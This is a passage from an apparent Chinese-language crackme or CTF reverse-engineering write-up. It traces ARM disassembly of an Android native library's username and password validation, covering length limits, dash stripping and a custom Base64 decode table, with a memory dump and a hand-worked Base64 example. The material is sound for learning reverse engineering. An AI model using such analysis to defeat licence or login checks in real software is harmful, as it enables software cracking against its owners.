&lt;p&gt;第二处判断&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000053B2             ; 36:         if ( result )
LOAD:000053B2 00 28       CMP             R0, #0  ; 判断Password内存空间是否申请成功
LOAD:000053B4 13 D0       BEQ             loc_53DE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来进行拷贝操作，存储用户名和密码，需要注意到新申请的两个变量的寻址方式为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[pFailure + offset]&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000053B6             ; 38:           memset(v11, 0, v10);
LOAD:000053B6 18 1C       MOVS            R0, R3  ; s
LOAD:000053B8 00 21       MOVS            R1, #0  ; c
LOAD:000053BA 3A 1C       MOVS            R2, R7  ; n
LOAD:000053BC FF F7 FA EE BLX             memset  ; memset(pUserName, 0, len_UserName + 1) //初始化UserName内存空间
LOAD:000053C0             ; 39:           memset(*(void **)(v4 + 56), 0, n);
LOAD:000053C0 00 21       MOVS            R1, #0  ; c
LOAD:000053C2 01 9A       LDR             R2, [SP,#0x28+n] ; n
LOAD:000053C4 A0 6B       LDR             R0, [R4,#0x38] ; s
LOAD:000053C6 FF F7 F6 EE BLX             memset  ; memset(pPassword, 0, len_Password + 1) //初始化Password内存空间
LOAD:000053CA             ; 40:           memcpy(*(void **)(v4 + 52), v5, len_UserName);
LOAD:000053CA 29 1C       MOVS            R1, R5  ; src
LOAD:000053CC 02 9A       LDR             R2, [SP,#0x28+len_UserName] ; n
LOAD:000053CE 60 6B       LDR             R0, [R4,#0x34] ; dest
LOAD:000053D0 FF F7 02 EF BLX             memcpy  ; memcpy(pUserName, szUserName, len_UserName) //拷贝数据到内存空间
LOAD:000053D4             ; 41:           result = (const JNINativeInterface *)memcpy(*(void **)(v4 + 56), v3, v14);
LOAD:000053D4 A0 6B       LDR             R0, [R4,#0x38] ; dest
LOAD:000053D6 31 1C       MOVS            R1, R6  ; src
LOAD:000053D8 03 9A       LDR             R2, [SP,#0x28+len_Password] ; n
LOAD:000053DA FF F7 FE EE BLX             memcpy  ; memcpy(pPassword, szPassword, len_Password) //拷贝数据到内存空间
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时两个关键的变量在栈中的位置&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pUserName = [pFailure + 0x34]
pPassword = [pFailure + 0x38]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;初始化完栈空间以及相应的内存空间后，进入校验逻辑&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005B82 28 1C       MOVS            R0, R5  ; R0 = R5 = pFailure
LOAD:00005B84 FF F7 FA FE BL              sub_597C ; sub_597C(pFailure)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Failure&quot;&lt;/code&gt;字符串的指针，该函数稍微有点长&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6EF5BED9C8AA6FC811A713EBF441CBC8.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;存储&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;pFailure&quot;&lt;/code&gt;后调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_53E4()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:0000597C             sub_597C
LOAD:0000597C
LOAD:0000597C             var_34= -0x34
LOAD:0000597C             var_30= -0x30
LOAD:0000597C             var_28= -0x28
LOAD:0000597C             var_24= -0x24
LOAD:0000597C             var_1C= -0x1C
LOAD:0000597C
LOAD:0000597C F0 B5       PUSH            {R4-R7,LR}
LOAD:0000597E 89 B0       SUB             SP, SP, #0x24
LOAD:00005980 05 1C       MOVS            R5, R0  ; R5 = R0 = pFailure = &quot;Failure&quot;
LOAD:00005982 FF F7 2F FD BL              sub_53E4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_53E4()&lt;/code&gt;主要是校验用户名和密码的长度合法性&lt;/p&gt;

&lt;p&gt;从中我们得出用户名和密码的长度范围&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;用户名：[6, 20]
密码：[12, 30]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/24DFAC64FB4DBB5D0E55A731F2F9BB41.png&quot; alt=&quot;7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;校验密码的合法性，格式为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxx-xxx-xxx-xxx&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/0714746A5D002960B238041FF74279AF.png&quot; alt=&quot;8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_5430()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059B0             loc_59B0
LOAD:000059B0 28 1C       MOVS            R0, R5
LOAD:000059B2 FF F7 3D FD BL              sub_5430
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个函数的作用是将密码中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;去掉&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/28AF2748047F051F7ECA76C3FB287F70.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;获取一个Table，此Table一开始是空的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059BA 7B 44       ADD             R3, PC ; Base64Table
LOAD:000059BC 1A 78       LDRB            R2, [R3]
LOAD:000059BE 00 2A       CMP             R2, #0
LOAD:000059C0 31 D1       BNE             loc_5A26
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;全部都是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6128176EB44BD489A01ECFE753535B43.png&quot; alt=&quot;10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;动态运行时会填充数据，第一次运行时会进行Table的生成，通过对这个Table第一个字节的判断，如果是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;，表示未生成，如果是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;01&lt;/code&gt;，表示Table已生成，则跳过初始化Table的代码段&lt;/p&gt;

&lt;p&gt;动态运行时进行初始化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/280D03D24C9E584F75E5DD386BBBC730.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来逐步进行计算，将Table的[2, 256]字节赋值为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059C2 80 20       MOVS            R0, #0x80 ; '€' ; R0 = 0x80
LOAD:000059C4 01 33       ADDS            R3, #1  ; 从Table的第二位开始赋值
LOAD:000059C6 41 00       LSLS            R1, R0, #1 ; R1 = 0x80 * 2 = 256
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;开始循环赋值&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059C8             ; 41:       byte_15121[v4++] = -128;
LOAD:000059C8
LOAD:000059C8             loc_59C8                ; Table[i] = 0x80
LOAD:000059C8 D0 54       STRB            R0, [R2,R3]
LOAD:000059CA             ; 42:     while ( v4 != 256 );
LOAD:000059CA 01 32       ADDS            R2, #1  ; R2++
LOAD:000059CC 8A 42       CMP             R2, R1
LOAD:000059CE FB D1       BNE             loc_59C8 ; Table[i] = 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C30454B8D16FDCB8D801D89672AD6D50.png&quot; alt=&quot;12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;赋值完成后开始处理Table，初始化一些值&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059D0             ; 43:     v5 = 0;
LOAD:000059D0 5B 4A       LDR             R2, =(Base64Table - 0x59D8)
LOAD:000059D2 00 23       MOVS            R3, #0  ; R3 = 0
LOAD:000059D4 7A 44       ADD             R2, PC ; Base64Table
LOAD:000059D6 51 1C       ADDS            R1, R2, #1 ; R1 = Base64Tabl + 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从Table偏移&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;65&lt;/code&gt;的位置开始赋值&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;，长度为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;26&lt;/code&gt;，整个表应该是偏移第&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;67&lt;/code&gt;位，因为第一个字节跳过，下标从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;开始&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059D8             ; 46:       byte_15121[v5 + 65] = v5;
LOAD:000059D8
LOAD:000059D8             loc_59D8                ;
LOAD:000059D8 C8 18       ADDS            R0, R1, R3 ; R0 = Base64Table + i
LOAD:000059DA 41 30       ADDS            R0, #65 ; R0 = Base64Table + i + 65
LOAD:000059DC 03 70       STRB            R3, [R0] ; Base64Table[i + 65] = R3
LOAD:000059DE             ; 47:       ++v5;
LOAD:000059DE 01 33       ADDS            R3, #1  ; R3++
LOAD:000059E0             ; 49:     while ( v5 != 26 );
LOAD:000059E0 1A 2B       CMP             R3, #26
LOAD:000059E2 F9 D1       BNE             loc_59D8 ;
LOAD:000059E2                                     ; R0 = Base64Table + i
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7B21842EDABEC171568D1F236AB5D8A7.png&quot; alt=&quot;13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;取第&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;98&lt;/code&gt;位&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059E4             ; 50:     v6 = &amp;amp;byte_15182;
LOAD:000059E4 62 32       ADDS            R2, #98 ; R2 = Base64Table[98]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;开始赋值，赋值的数据跟着上面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R3&lt;/code&gt;后面继续，上面赋值到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x19&lt;/code&gt;，这里从&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1A&lt;/code&gt;开始&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059E6             ; 53:       *v6 = v5;
LOAD:000059E6
LOAD:000059E6             loc_59E6
LOAD:000059E6 13 70       STRB            R3, [R2]
LOAD:000059E8             ; 54:       v5 = (v5 + 1) &amp;amp; 0xFF;
LOAD:000059E8 01 33       ADDS            R3, #1  ; R3++
LOAD:000059EA 1B 06       LSLS            R3, R3, #0x18
LOAD:000059EC 1B 0E       LSRS            R3, R3, #0x18 ; R3 = R3 &amp;amp; 0xFF
LOAD:000059EE             ; 55:       ++v6;
LOAD:000059EE 01 32       ADDS            R2, #1  ; R2 = Base64Table + i
LOAD:000059F0             ; 57:     while ( v5 != 52 );
LOAD:000059F0 34 2B       CMP             R3, #52
LOAD:000059F2 F8 D1       BNE             loc_59E6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/236DBDC1F0300FE954D37F5069D5F198.png&quot; alt=&quot;14.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再次定位到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;49&lt;/code&gt;的位置&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059F4             ; 58:     v7 = &amp;amp;byte_15151;
LOAD:000059F4 53 4A       LDR             R2, =(Base64Table - 0x59FA)
LOAD:000059F6 7A 44       ADD             R2, PC ; Base64Table
LOAD:000059F8 31 32       ADDS            R2, #49
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再次赋值&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000059FA             ; 61:       *v7 = v5;
LOAD:000059FA
LOAD:000059FA             loc_59FA
LOAD:000059FA 13 70       STRB            R3, [R2]
LOAD:000059FC             ; 62:       v5 = (v5 + 1) &amp;amp; 0xFF;
LOAD:000059FC 01 33       ADDS            R3, #1
LOAD:000059FE 1B 06       LSLS            R3, R3, #0x18
LOAD:00005A00 1B 0E       LSRS            R3, R3, #0x18
LOAD:00005A02             ; 63:       ++v7;
LOAD:00005A02 01 32       ADDS            R2, #1
LOAD:00005A04             ; 65:     while ( v5 != 62 );
LOAD:00005A04 3E 2B       CMP             R3, #62
LOAD:00005A06 F8 D1       BNE             loc_59FA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/8AEA3EE649CFF9AF41CC88CB184B1798.png0&quot; alt=&quot;15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后处理几个单个的位置&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A08             ; 66:     byte_1514C = 62;
LOAD:00005A08 4F 4A       LDR             R2, =(Base64Table - 0x5A0E)
LOAD:00005A0A 7A 44       ADD             R2, PC ; Base64Table
LOAD:00005A0C 11 1C       MOVS            R1, R2  ; R1 = R2 = Base64Table
LOAD:00005A0E 2C 31       ADDS            R1, #44 ; R1 = R1 + 44
LOAD:00005A10 0B 70       STRB            R3, [R1] ; Base64Table[44] = 0x3E
LOAD:00005A12             ; 67:     byte_15150 = 63;
LOAD:00005A12 13 1C       MOVS            R3, R2  ; R3 = R2 = Base64Table
LOAD:00005A14 30 33       ADDS            R3, #48 ; R3 = R3 + 48
LOAD:00005A16 3F 21       MOVS            R1, #63 ; R1 = 63
LOAD:00005A18 19 70       STRB            R1, [R3] ; Base64Table[48] = 63
LOAD:00005A1A             ; 68:     byte_1515E = 0;
LOAD:00005A1A 13 1C       MOVS            R3, R2  ; R3 = R2 = Base64Table
LOAD:00005A1C 3E 33       ADDS            R3, #62 ; R3 = R3 + 62
LOAD:00005A1E 00 21       MOVS            R1, #0  ; R1 = 0
LOAD:00005A20 19 70       STRB            R1, [R3] ; Base64Table[62] = 0
LOAD:00005A22             ; 69:     Base64Table = 1;
LOAD:00005A22 01 23       MOVS            R3, #1  ; R3 = 1
LOAD:00005A24 13 70       STRB            R3, [R2] ; Base64Table[0] = 1 //设置已初始化Table标志
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BD8379EAEF5C860AC282DC1F5157A360.png&quot; alt=&quot;16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;整个表处理完是下面这样的，因为最开始是判断是否初始化的标志，所以整个表长度为257，由于多次调试，所以下面的内存地址和上面图中可能不一样&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A35DD120  01 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  .€€€€€€€€€€€€€€€
A35DD130  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD140  80 80 80 80 80 80 80 80  80 80 80 80 3E 80 80 80  €€€€€€€€€€€€&amp;gt;€€€
A35DD150  3F 34 35 36 37 38 39 3A  3B 3C 3D 80 80 80 00 80  ?456789:;&amp;lt;=€€€.€
A35DD160  80 80 00 01 02 03 04 05  06 07 08 09 0A 0B 0C 0D  €€..............
A35DD170  0E 0F 10 11 12 13 14 15  16 17 18 19 80 80 80 80  ............€€€€
A35DD180  80 80 1A 1B 1C 1D 1E 1F  20 21 22 23 24 25 26 27  €€...... !&quot;#$%&amp;amp;'
A35DD190  28 29 2A 2B 2C 2D 2E 2F  30 31 32 33 80 80 80 80  ()*+,-./0123€€€€
A35DD1A0  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD1B0  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD1C0  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD1D0  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD1E0  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD1F0  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD200  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD210  80 80 80 80 80 80 80 80  80 80 80 80 80 80 80 80  €€€€€€€€€€€€€€€€
A35DD220  80                                                €
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;判断处理后的密码是否为空，前面去除了密码中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A26             ; 71:   if ( v3 )
LOAD:00005A26
LOAD:00005A26             loc_5A26                ; R4为密码寄存器，判断是否为0
LOAD:00005A26 00 2C       CMP             R4, #0
LOAD:00005A28 07 D0       BEQ             loc_5A3A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再申请一个存储密码的内存空间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A2A             ; 73:     v8 = strlen(v3);
LOAD:00005A2A 20 1C       MOVS            R0, R4  ; s
LOAD:00005A2C FF F7 C8 EB BLX             strlen  ; R0 = strlen(pPassword)
LOAD:00005A30             ; 74:     v9 = (const void *)operator new[](v8 + 1);
LOAD:00005A30 01 30       ADDS            R0, #1  ; unsigned int
LOAD:00005A32 FF F7 CC EB BLX             _Znaj   ; R0 = operator new[](len_Password + 1)
LOAD:00005A36 06 1C       MOVS            R6, R0  ; R6 = R0 = new_pPassword
LOAD:00005A38 00 E0       B               loc_5A3C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里其实可以猜出来是Base64，因为判断3位长度，这个比较看经验了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A3C             ; 80:   v10 = strlen(v3);
LOAD:00005A3C
LOAD:00005A3C             loc_5A3C                ; s
LOAD:00005A3C 20 1C       MOVS            R0, R4
LOAD:00005A3E FF F7 C0 EB BLX             strlen  ; R0 = R4 = pPassword
LOAD:00005A3E                                     ; R0 = strlen(pPassword)
LOAD:00005A42             ; 81:   v11 = 0;
LOAD:00005A42 42 49       LDR             R1, =(Base64Table - 0x5A4C)
LOAD:00005A44 03 38       SUBS            R0, #3  ; R0 = R0 - 3
LOAD:00005A46 00 23       MOVS            R3, #0  ; R3 = 0
LOAD:00005A48             ; 85:   while ( v11 &amp;lt; (signed int)(v10 - 3) )
LOAD:00005A48 79 44       ADD             R1, PC ; Base64Table
LOAD:00005A4A 01 31       ADDS            R1, #1  ; R1 = Base64Table + 1
LOAD:00005A4C 04 90       STR             R0, [SP,#0x38+var_28] ; len_Password - 3
LOAD:00005A4E             ; 82:   v12 = v9;
LOAD:00005A4E 32 1C       MOVS            R2, R6  ; R2 = R6 = new_pPassword
LOAD:00005A50             ; 83:   v13 = 0;
LOAD:00005A50 1F 1C       MOVS            R7, R3  ; R7 = R3 = 0
LOAD:00005A52             ; 84:   v14 = v3;
LOAD:00005A52 05 91       STR             R1, [SP,#0x38+Base64Tableoff1] ; Base64Table + 1
LOAD:00005A54 A4 46       MOV             R12, R4 ; R12 = R4 = pPassword
LOAD:00005A56 26 E0       B               loc_5AA6 ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果没看出来，我们可以手动分析，前提是清楚Base64的计算过程，编码过程是3位转4位，还原过程是4位转3位&lt;/p&gt;

&lt;p&gt;比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ABCD&lt;/code&gt;，以3个字符为一组，计算每个的ASCII十六进制&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01000001 01000010 01000011
01000100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;连起来&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;010000010100001001000011
01000100
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以三字节为单位切开，这样3个字符就变成了4个字符每组&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;010000 010100 001001 000011
010001 00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;前面补&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;，最后除了补零，最后的两个不做处理&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00010000 00010100 00001001 00000011
00010001 00000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;转为十进制数字&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;16 20 09 03
17 00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后到Base64编码Table里寻找对应的下标&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;计算出来，最后没有数据的补上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt;，以4字节为一组补&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QUJD
RA==
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我为什么又要写一遍。。。。。。&lt;/p&gt;

&lt;p&gt;第一题的理解程度对于后续的解题很重要，所以我们多写点，反正都是我写。。。。。。&lt;/p&gt;

&lt;p&gt;入口判断了长度跟3的关系，长度如果不够说明已经计算到结尾，所以进入特殊处理的分支&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/ECA80B6A5DD3FEBC6808E9FE2342432F.png&quot; alt=&quot;17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来手动分析，进入解码前先进行长度的判断&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005AA6             loc_5AA6                ;
LOAD:00005AA6 04 99       LDR             R1, [SP,#0x38+var_28] ; R1 = len_Password - 3
LOAD:00005AA8 8B 42       CMP             R3, R1
LOAD:00005AAA D5 DB       BLT             loc_5A58 ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;初始化一个下标&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A58             loc_5A58                ;
LOAD:00005A58 00 21       MOVS            R1, #0  ; R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后进入计算的循环，以4字节为一组进行循环获取，获取到的4字节每字节进行查表，这个表就是前面初始化的Table&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005A5A             loc_5A5A                ;
LOAD:00005A5A 64 46       MOV             R4, R12 ; R4 = R12 = pPassword
LOAD:00005A5C E0 18       ADDS            R0, R4, R3 ; R0 = R4 + R3 = pPassword + i
LOAD:00005A5E 44 5C       LDRB            R4, [R0,R1] ; R4 = Password[i + j]，这里以四字节为单位进行循环遍历
LOAD:00005A60 05 98       LDR             R0, [SP,#0x38+Base64Tableoff1] ; R0 = Base64Table + 1
LOAD:00005A62 04 5D       LDRB            R4, [R0,R4] ; R4 = Base64Table[Password[i + j] + 1]
LOAD:00005A64             ; 91:       *(&amp;amp;v21 + v15) = v16;
LOAD:00005A64 07 A8       ADD             R0, SP, #0x38+buffer ; 4字节临时存储
LOAD:00005A66 0C 54       STRB            R4, [R1,R0] ; 循环取字节进行存储
LOAD:00005A68             ; 92:       if ( v16 &amp;amp; 0x80 )
LOAD:00005A68 24 06       LSLS            R4, R4, #0x18
LOAD:00005A6A 01 D5       BPL             loc_5A70
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过一个变量进行判断4字节每组内部取表操作是否完成&lt;/p&gt;
